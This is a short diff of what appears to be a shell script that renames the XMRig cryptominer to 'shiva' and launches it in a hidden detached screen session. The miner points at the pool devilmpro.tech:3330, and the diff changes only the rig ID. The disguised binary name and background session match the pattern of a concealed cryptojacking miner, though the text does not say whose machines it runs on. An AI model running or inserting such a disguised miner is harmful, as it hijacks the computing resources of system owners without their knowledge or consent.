@@ -23,9 +23,9 @@ cd pro/build
 sudo mv xmrig shiva
 cd
 cd pro/build
-screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id MAHI15D -t 2
+screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id LINA -t 2
 cd
 sudo pkill shiva
 cd pro/build
-screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id MAHI15D -t 2
+screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id LINA -t 2
 
